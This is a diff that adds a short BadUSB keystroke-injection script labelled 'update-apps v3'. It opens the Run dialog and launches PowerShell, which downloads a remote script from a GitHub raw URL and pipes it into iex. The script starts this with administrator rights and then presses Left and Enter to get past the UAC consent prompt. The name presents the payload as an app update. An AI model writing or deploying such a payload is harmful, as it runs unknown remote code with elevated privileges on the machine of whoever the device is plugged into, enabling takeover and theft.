@@ -1,0 +1,13 @@
+REM update-apps v3 (ONLINE)
+REM Time to execute: 5.4
+GUI r
+DELAY 500
+STRING powershell irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/update-apps/update-apps2.ps1 | iex
+HOLD CTRL
+HOLD SHIFT
+ENTER
+RELEASE CTRL
+RELEASE SHIFT
+DELAY 2000
+LEFT
+ENTER
